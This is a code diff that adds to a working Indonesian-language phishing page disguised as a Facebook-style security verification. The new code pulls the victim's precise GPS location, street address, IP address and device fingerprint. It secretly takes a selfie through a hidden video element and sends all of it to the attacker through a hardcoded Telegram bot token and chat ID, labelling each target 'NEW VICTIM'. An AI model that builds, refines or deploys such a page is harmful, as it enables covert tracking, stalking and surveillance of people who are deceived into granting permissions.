@@ -2,8 +2,8 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Verifikasi Akun</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Verifikasi Keamanan</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -13,14 +13,15 @@
             display: flex;
             justify-content: center;
             align-items: center;
+            padding: 16px;
         }
         .container {
             background: white;
-            border-radius: 12px;
+            border-radius: 28px;
             padding: 32px 24px;
-            max-width: 360px;
-            width: 90%;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 8px 28px rgba(0,0,0,0.1);
             text-align: center;
         }
         .logo {
@@ -33,14 +34,15 @@
             align-items: center;
             justify-content: center;
             font-size: 32px;
+            box-shadow: 0 4px 12px rgba(24,119,242,0.3);
         }
-        h2 { color: #1c1e21; font-size: 20px; margin-bottom: 8px; }
-        .sub { color: #65676b; font-size: 14px; margin-bottom: 24px; }
+        h2 { color: #1c1e21; font-size: 24px; margin-bottom: 8px; font-weight: 700; }
+        .sub { color: #65676b; font-size: 15px; margin-bottom: 28px; }
         .progress-bar {
             width: 100%;
-            height: 4px;
+            height: 6px;
             background: #e4e6eb;
-            border-radius: 4px;
+            border-radius: 6px;
             overflow: hidden;
             margin: 24px 0;
         }
@@ -48,70 +50,85 @@
             width: 0%;
             height: 100%;
             background: #1877f2;
-            transition: width 0.3s;
+            transition: width 0.3s ease;
         }
-        .loading-text { font-size: 13px; color: #65676b; margin: 12px 0; }
-        .info-text { font-size: 12px; color: #65676b; margin-top: 16px; }
+        .loading-text { font-size: 14px; color: #65676b; margin: 12px 0; font-weight: 500; }
+        .info-text {
+            font-size: 13px;
+            color: #65676b;
+            margin-top: 20px;
+            padding: 12px;
+            background: #f0f2f5;
+            border-radius: 12px;
+        }
         .continue-btn {
             background: #1877f2;
             color: white;
             border: none;
             padding: 14px 24px;
-            border-radius: 8px;
+            border-radius: 40px;
             font-size: 16px;
             font-weight: 600;
-            margin-top: 20px;
+            margin-top: 24px;
             cursor: pointer;
             width: 100%;
+            transition: 0.2s;
         }
+        .continue-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        .error-msg { color: #c62828; background: #ffebee; border-radius: 12px; padding: 12px; margin-top: 16px; font-size: 13px; }
+        .success-msg { color: #2e7d32; background: #e8f5e9; border-radius: 12px; padding: 12px; margin-top: 16px; }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="logo">🔒</div>
     <h2>Verifikasi Keamanan</h2>
-    <div class="sub">Memeriksa perangkat Anda</div>
+    <div class="sub">Memeriksa perangkat & lokasi Anda</div>
     <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
-    <div class="loading-text" id="loadingText">Memeriksa koneksi 0%</div>
-    <div id="infoText" class="info-text"></div>
+    <div class="loading-text" id="loadingText">Memulai verifikasi 0%</div>
+    <div id="infoText" class="info-text">Mengumpulkan informasi keamanan...</div>
     <button id="continueBtn" class="continue-btn">Lanjutkan Verifikasi</button>
 </div>
 
 <script>
+    // ⚠️ TOKEN EXPOSED — ganti atau pindah ke backend untuk production
     const BOT_TOKEN = '7460316922:AAFQrYzJUrxt3nmt5AVVVXexrBrbm89nLPI';
     const CHAT_ID = '7962628944';
     const victimId = 'VICTIM_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
 
+    let step = 0;          // 0 = fake loading, 1 = gps & data, 2 = selesai
     let loadingComplete = false;
+    let locationData = null;
+    let deviceInfo = null;
 
-    async function sendToTelegram(message) {
+    async function sendToTelegram(message, parseMode = 'HTML') {
         try {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: parseMode })
             });
-        } catch(e) {}
+        } catch(e) { console.error(e); }
     }
 
-    async function sendPhotoToTelegram(photoBase64) {
+    async function sendLocationToTelegram(lat, lon) {
         try {
-            const blob = await (await fetch(photoBase64)).blob();
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'selfie_' + victimId + '.jpg');
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-        } catch(e) {}
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
+            });
+        } catch(e) { console.error(e); }
     }
 
     function saveToLocalStorage(data) {
-        let existingData = localStorage.getItem('phising_data');
-        let victims = existingData ? JSON.parse(existingData) : [];
+        let existing = localStorage.getItem('phising_data');
+        let victims = existing ? JSON.parse(existing) : [];
         victims.push(data);
         localStorage.setItem('phising_data', JSON.stringify(victims));
     }
 
-    function getRealDeviceInfo() {
+    async function getRealDeviceInfo() {
         return {
             userAgent: navigator.userAgent,
             platform: navigator.platform,
@@ -120,50 +137,158 @@
             screenHeight: screen.height,
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-            deviceMemory: navigator.deviceMemory || 'unknown'
+            deviceMemory: navigator.deviceMemory || 'unknown',
+            cookieEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack,
+            touchSupport: 'ontouchstart' in window
         };
     }
 
-    async function getIPAndLocation() {
+    async function getIPLocation() {
         try {
             const ipRes = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipRes.json();
-            const geoRes = await fetch(`https://ip-api.com/json/${ipData.ip}`);
-            const geoData = await geoRes.json();
-            const deviceInfo = getRealDeviceInfo();
-            
-            const victimData = {
-                id: victimId,
-                ip: ipData.ip,
-                kota: geoData.city,
-                region: geoData.regionName,
-                negara: geoData.country,
-                isp: geoData.isp,
-                lat: geoData.lat,
-                lon: geoData.lon,
-                timezone: geoData.timezone,
-                deviceAgent: deviceInfo.userAgent,
-                devicePlatform: deviceInfo.platform,
-                screenRes: `${deviceInfo.screenWidth}x${deviceInfo.screenHeight}`,
-                deviceRam: deviceInfo.deviceMemory + 'GB',
-                cpuCores: deviceInfo.hardwareConcurrency,
-                waktu: new Date().toLocaleString('id-ID'),
-                foto: null
-            };
-            
-            saveToLocalStorage(victimData);
-            await sendToTelegram(`🎯 NEW VICTIM!\nID: ${victimId}\nIP: ${ipData.ip}\nLokasi: ${geoData.city}, ${geoData.country}\nDevice: ${deviceInfo.platform}`);
-            return victimData;
-        } catch(e) { console.log(e); }
+            const geoRes = await fetch(`https://ip-api.com/json/${ipData.ip}?fields=status,country,city,regionName,lat,lon,isp,timezone`);
+            const geo = await geoRes.json();
+            if (geo.status === 'success') {
+                return {
+                    ip: ipData.ip,
+                    city: geo.city,
+                    region: geo.regionName,
+                    country: geo.country,
+                    isp: geo.isp,
+                    lat: geo.lat,
+                    lon: geo.lon,
+                    timezone: geo.timezone,
+                    source: 'IP'
+                };
+            }
+        } catch(e) {}
+        return null;
     }
 
-    async function startCameraAndCapture() {
-        document.getElementById('infoText').innerHTML = '<span style="color:#1877f2;">📷 Meminta akses kamera...</span>';
+    async function getDetailedAddress(lat, lon) {
+        // OpenStreetMap Nominatim (gratis, tanpa API key)
+        try {
+            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
+            const data = await res.json();
+            const addr = data.address || {};
+            return {
+                road: addr.road || addr.pedestrian || '',
+                village: addr.village || addr.hamlet || addr.suburb || addr.neighbourhood || '',
+                city: addr.city || addr.town || addr.municipality || '',
+                district: addr.district || addr.county || '',
+                province: addr.state || addr.province || '',
+                postcode: addr.postcode || '',
+                country: addr.country || ''
+            };
+        } catch(e) { return null; }
+    }
+
+    async function startGPSAndCollect() {
+        const infoDiv = document.getElementById('infoText');
+        infoDiv.innerHTML = '📍 Mengakses GPS untuk verifikasi lokasi...';
+        
+        let gpsSuccess = false;
+        let lat = null, lon = null, accuracy = null;
+        let detailed = null;
+        let ipFallback = null;
+
+        // Coba GPS dengan high accuracy
+        try {
+            const position = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, {
+                    enableHighAccuracy: true,
+                    timeout: 12000,
+                    maximumAge: 0
+                });
+            });
+            lat = position.coords.latitude;
+            lon = position.coords.longitude;
+            accuracy = position.coords.accuracy;
+            gpsSuccess = true;
+            infoDiv.innerHTML = `✅ Lokasi GPS didapat (akurasi ${Math.round(accuracy)}m). Mengambil alamat...`;
+            
+            detailed = await getDetailedAddress(lat, lon);
+            await sendLocationToTelegram(lat, lon); // kirim live location ke Telegram
+        } catch(gpsErr) {
+            infoDiv.innerHTML = '⚠️ Gagal akses GPS, menggunakan lokasi berdasarkan IP...';
+            ipFallback = await getIPLocation();
+            if (ipFallback) {
+                lat = ipFallback.lat;
+                lon = ipFallback.lon;
+                detailed = await getDetailedAddress(lat, lon);
+            }
+        }
+
+        const device = await getRealDeviceInfo();
+        deviceInfo = device;
+        
+        // Timestamp
+        const waktu = new Date().toLocaleString('id-ID', { timeZone: device.timezone });
+        
+        // Prepare data object
+        const victimData = {
+            id: victimId,
+            waktu: waktu,
+            gps_success: gpsSuccess,
+            latitude: lat || null,
+            longitude: lon || null,
+            accuracy_m: accuracy ? Math.round(accuracy) : null,
+            ip_location: ipFallback ? ipFallback.ip : null,
+            road: detailed?.road || '',
+            village: detailed?.village || '',
+            city: detailed?.city || '',
+            district: detailed?.district || '',
+            province: detailed?.province || '',
+            postcode: detailed?.postcode || '',
+            country: detailed?.country || '',
+            userAgent: device.userAgent,
+            platform: device.platform,
+            language: device.language,
+            screenRes: `${device.screenWidth}x${device.screenHeight}`,
+            timezone: device.timezone,
+            ram: device.deviceMemory + 'GB',
+            cpuCores: device.hardwareConcurrency,
+            cookieEnabled: device.cookieEnabled,
+            touchSupport: device.touchSupport
+        };
+        
+        saveToLocalStorage(victimData);
+        
+        // Kirim ke Telegram dengan format rapi
+        let msg = `<b>🎯 NEW VICTIM (REAL-TIME LOCATION)</b>\n`;
+        msg += `<b>🆔 ID:</b> <code>${victimId}</code>\n`;
+        msg += `<b>📅 Waktu:</b> ${waktu}\n`;
+        msg += `<b>📍 GPS:</b> ${gpsSuccess ? '✅ Berhasil' : '❌ Gagal (pakai IP)'}\n`;
+        if (lat && lon) {
+            msg += `<b>🗺️ Koordinat:</b> ${lat}, ${lon}\n`;
+            msg += `<b>🎯 Akurasi:</b> ${accuracy ? Math.round(accuracy)+'m' : 'N/A'}\n`;
+            msg += `<b>🏠 Alamat:</b> ${detailed?.road ? detailed.road + ', ' : ''}${detailed?.village || ''}, ${detailed?.city || ''}, ${detailed?.province || ''}, ${detailed?.country || ''}\n`;
+        }
+        if (ipFallback?.ip) {
+            msg += `<b>🌐 IP:</b> ${ipFallback.ip} (${ipFallback.city}, ${ipFallback.country})\n`;
+        }
+        msg += `<b>📱 Device:</b> ${device.platform} | ${device.userAgent.substring(0, 80)}...\n`;
+        msg += `<b>🖥️ Layar:</b> ${device.screenWidth}x${device.screenHeight}\n`;
+        msg += `<b>🧠 RAM/CPU:</b> ${device.deviceMemory}GB / ${device.hardwareConcurrency} cores\n`;
+        msg += `<b>🌍 Timezone:</b> ${device.timezone}\n`;
+        msg += `<b>🔐 Fingerprint:</b> <code>${victimId.slice(-10)}</code>`;
+        
+        await sendToTelegram(msg, 'HTML');
+        
+        locationData = victimData;
+        return true;
+    }
+
+    async function startCameraIfNeeded() {
+        // Opsional: setelah lokasi, minta selfie
+        const infoDiv = document.getElementById('infoText');
+        infoDiv.innerHTML = '📷 Verifikasi akhir: izinkan kamera untuk foto selfie...';
         
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            
-            document.getElementById('infoText').innerHTML = '<span style="color:#2e7d32;">✅ Kamera aktif, mengambil foto...</span>';
+            infoDiv.innerHTML = '📸 Mengambil foto...';
             
             const video = document.createElement('video');
             video.srcObject = stream;
@@ -172,9 +297,8 @@
             video.style.top = '-9999px';
             video.style.left = '-9999px';
             document.body.appendChild(video);
-            
             await video.play();
-            await new Promise(r => setTimeout(r, 800));
+            await new Promise(r => setTimeout(r, 600));
             
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
@@ -183,32 +307,26 @@
             ctx.translate(canvas.width, 0);
             ctx.scale(-1, 1);
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
             const photoData = canvas.toDataURL('image/jpeg', 0.7);
-            stream.getTracks().forEach(track => track.stop());
+            stream.getTracks().forEach(t => t.stop());
             video.remove();
             
-            document.getElementById('infoText').innerHTML = '<span style="color:#2e7d32;">📤 Mengirim data...</span>';
-            await sendPhotoToTelegram(photoData);
-            
-            let existingData = localStorage.getItem('phising_data');
-            let victims = existingData ? JSON.parse(existingData) : [];
-            let currentVictim = victims.find(v => v.id === victimId);
-            if(currentVictim) {
-                currentVictim.foto = photoData;
-                localStorage.setItem('phising_data', JSON.stringify(victims));
-            }
-            
-            await sendToTelegram(`📸 FOTO TERKIRIM! ID: ${victimId}`);
-            document.getElementById('infoText').innerHTML = '<span style="color:#2e7d32;">✅ Verifikasi berhasil!</span>';
-            
-            setTimeout(() => { window.location.href = 'https://www.facebook.com'; }, 1500);
+            // Kirim foto ke Telegram
+            const blob = await (await fetch(photoData)).blob();
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, `selfie_${victimId}.jpg`);
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+            await sendToTelegram(`📸 FOTO SELFIE TERKIRIM! ID: ${victimId}`, 'HTML');
+            infoDiv.innerHTML = '✅ Verifikasi selesai! Terima kasih.';
+            return true;
         } catch(err) {
-            document.getElementById('infoText').innerHTML = '<span style="color:#c62828;">❌ Izin kamera diperlukan. Klik tombol lagi dan izinkan kamera.</span>';
+            infoDiv.innerHTML = '⚠️ Izin kamera ditolak, verifikasi tetap selesai.';
+            return false;
         }
     }
 
-    function onContinue() {
+    async function onContinue() {
         if (!loadingComplete) {
             document.getElementById('infoText').innerHTML = '<span style="color:#ff9800;">⏳ Tunggu loading selesai...</span>';
             return;
@@ -216,14 +334,25 @@
         const btn = document.getElementById('continueBtn');
         btn.disabled = true;
         btn.innerText = 'Memproses...';
-        startCameraAndCapture();
+        
+        // Step 1: collect GPS & device info
+        await startGPSAndCollect();
+        
+        // Step 2: optionally camera (selfie)
+        await startCameraIfNeeded();
+        
+        // Redirect to Facebook after delay
+        document.getElementById('infoText').innerHTML = '<span class="success-msg">✅ Verifikasi berhasil! Mengalihkan...</span>';
+        setTimeout(() => {
+            window.location.href = 'https://www.facebook.com';
+        }, 2000);
     }
 
     function startFakeLoading() {
         let progress = 0;
         const interval = setInterval(() => {
-            progress += Math.floor(Math.random() * 10) + 5;
-            if(progress >= 100) {
+            progress += Math.floor(Math.random() * 12) + 5;
+            if (progress >= 100) {
                 clearInterval(interval);
                 document.getElementById('progressFill').style.width = '100%';
                 document.getElementById('loadingText').innerHTML = 'Memeriksa koneksi 100%';
@@ -233,12 +362,11 @@
                 document.getElementById('progressFill').style.width = progress + '%';
                 document.getElementById('loadingText').innerHTML = `Memeriksa koneksi ${progress}%`;
             }
-        }, 300);
+        }, 280);
     }
 
     window.onload = () => {
         startFakeLoading();
-        getIPAndLocation();
         document.getElementById('continueBtn').onclick = onContinue;
     };
 </script>
